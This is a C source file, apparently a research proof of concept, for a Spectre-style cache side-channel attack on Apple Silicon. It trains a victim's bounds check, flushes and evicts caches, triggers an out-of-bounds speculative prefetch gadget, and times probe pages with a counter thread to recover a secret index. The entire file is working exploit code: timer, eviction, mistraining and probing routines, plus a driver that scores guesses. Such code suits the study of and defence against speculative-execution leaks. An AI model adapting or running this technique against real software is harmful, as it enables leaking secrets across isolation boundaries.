// separate_victim_page_oracle.c - separately compiled victim-object 16-way
// page oracle.
//
// architecture:
//   victim_page_oracle.c, compiled as a separate translation unit, holds a
//   secret page choice behind
//   a bounds-checked __builtin_prefetch gadget. the attacker only calls
//   victim_oracle_lookup() and probes the victim-owned candidate pages.
//
//   the shell driver launches this binary once per round to avoid the
//   within-process signal decay observed in long back-to-back runs.
//
// build:
//   make separate-victim-page-oracle
#include <mach/mach_time.h>
#include <pthread.h>
#include <pthread/qos.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <unistd.h>
#include "victim_page_oracle.h"

#define TRIALS_PER_ROUND 4000
#define ROUNDS           20
#define TRAIN            30
#define PAGE             16384
#define L2               (32*1024*1024)
#define NIB              VICTIM_TABLE_ENTRIES

static volatile uint64_t g_t; static volatile int g_r;
static void *tf(void *a){(void)a; pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE,0); while(g_r) g_t++; return NULL;}
static inline void bar(void){__asm__ volatile("dsb sy\n\tisb":::"memory");}
static inline uint64_t tl(volatile uint8_t *p){
    bar(); uint64_t a=g_t; bar();
    volatile uint8_t v=*p; __asm__ volatile("":: "r"(v):"memory");
    bar(); uint64_t b=g_t; return b-a;
}
static inline void cfl(void *p){__asm__ volatile("dc civac,%0"::"r"(p):"memory");}

static uint8_t *l2b, *D;

static void evict(void){
    volatile uint64_t s=0;
    for(size_t i=0;i<L2;i+=128) s^=l2b[i];
    (void)s; bar();
}

static double clock_ghz(void){
    mach_timebase_info_data_t tb; mach_timebase_info(&tb);
    uint64_t t0=mach_absolute_time(); volatile uint64_t x=0;
    __asm__ volatile("1:\n\tadd %0,%0,#1\n\tsubs %1,%1,#1\n\tb.ne 1b"
        :"+r"(x):"r"((uint64_t)5e8):);
    return 5e8/((mach_absolute_time()-t0)*tb.numer/tb.denom);
}

// one round: victim has already set a secret page. run TRIALS_PER_ROUND
// trials and return the top-1 candidate.
static int run_round(void){
    int hits[NIB]={0};
    volatile uint64_t *bound_addr = victim_get_bound_addr();

    for(int t=0; t<TRIALS_PER_ROUND; t++){
        if(t%1000==0) fprintf(stderr,"\r  trial %d/%d", t, TRIALS_PER_ROUND);

        for(int r=0; r<TRAIN; r++) victim_oracle_lookup(rand() % VICTIM_PUBLIC_SIZE);

        // match the self-contained oracle's exact flush/evict/warm sequence:
        // 1) flush all probe pages from L1
        for(int i=0;i<NIB;i++) cfl(victim_table[i]);
        // 2) L2 eviction #1: clears probes from L2
        bar(); evict();
        // 3) flush bound from L1
        cfl((void*)bound_addr); bar();
        // 4) flush the OOB pointer from L1
        // (ptr_array is a static array in victim_page_oracle.o - we can compute
        // the address from the exported victim_table base. but we don't have
        // direct access. the L2 walk should evict it if it's in L2.)
        // 5) L2 eviction #2: clears bound + ptr_array from L2
        bar(); evict();
        // 6) re-warm D
        __asm__ volatile("":: "r"(D[0]):"memory");
        bar();

        victim_oracle_lookup(VICTIM_PUBLIC_SIZE);  // OOB index

        (void)tl(D);
        int order[NIB];
        for(int i=0;i<NIB;i++) order[i]=i;
        for(int i=NIB-1;i>0;i--){int j=rand()%(i+1); int tmp=order[i]; order[i]=order[j]; order[j]=tmp;}
        int best=-1; uint64_t best_t=UINT64_MAX;
        for(int i=0;i<NIB;i++){
            int c=order[i];
            uint64_t tt=tl(victim_table[c]);
            if(tt<best_t){best_t=tt; best=c;}
        }
        uint64_t td=tl(D);
        if(best>=0 && best_t<td) hits[best]++;
    }
    fprintf(stderr,"\r                          \r");
    int top=0;
    for(int i=1;i<NIB;i++) if(hits[i]>hits[top]) top=i;
    return top;
}

int main(int argc, char **argv){
    setbuf(stdout,NULL);
    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE,0);
    double ghz=0;
    for(int attempt=0; attempt<20; attempt++){
        volatile uint64_t spin=0;
        for(uint64_t i=0;i<500000000ULL;i++) spin++;
        (void)spin;
        ghz=clock_ghz();
        fprintf(stderr,"clock attempt %d: %.2f GHz %s\n", attempt, ghz, ghz>=3.0?"P":"E");
        if(ghz>=3.0) break;
    }
    if(ghz<3.0){fprintf(stderr,"stuck on E-core after 20 tries\n"); return 2;}

    g_r=1; pthread_t tid; pthread_create(&tid,NULL,tf,NULL);
    while(!g_t){} usleep(10000);

    l2b=mmap(NULL,L2,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    memset(l2b,1,L2);
    D=mmap(NULL,PAGE,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    D[0]=0xFF;

    victim_oracle_init();

    // --round=N --secret=S mode: single round, print result, exit
    int single_round = -1, forced_secret = -1;
    for(int a=1;a<argc;a++){
        if(strncmp(argv[a],"--round=",8)==0) single_round=atoi(argv[a]+8);
        if(strncmp(argv[a],"--secret=",9)==0) forced_secret=atoi(argv[a]+9);
    }

    if(single_round >= 0 && forced_secret >= 0){
        srand(0xFACE + single_round);
        victim_set_oracle_target(forced_secret);
        int guess = run_round();
        printf("ROUND r=%d secret=%d guess=%d %s\n",
               single_round, forced_secret, guess,
               guess==forced_secret?"CORRECT":"wrong");
        g_r=0; pthread_join(tid,NULL);
        return (guess==forced_secret) ? 0 : 1;
    }

    // no args: print usage
    printf("usage: %s --round=N --secret=S\n", argv[0]);
    printf("  or use scripts/run_separate_victim_page_oracle.sh for the full 20-round demo\n");
    g_r=0; pthread_join(tid,NULL);
    return 0;
}
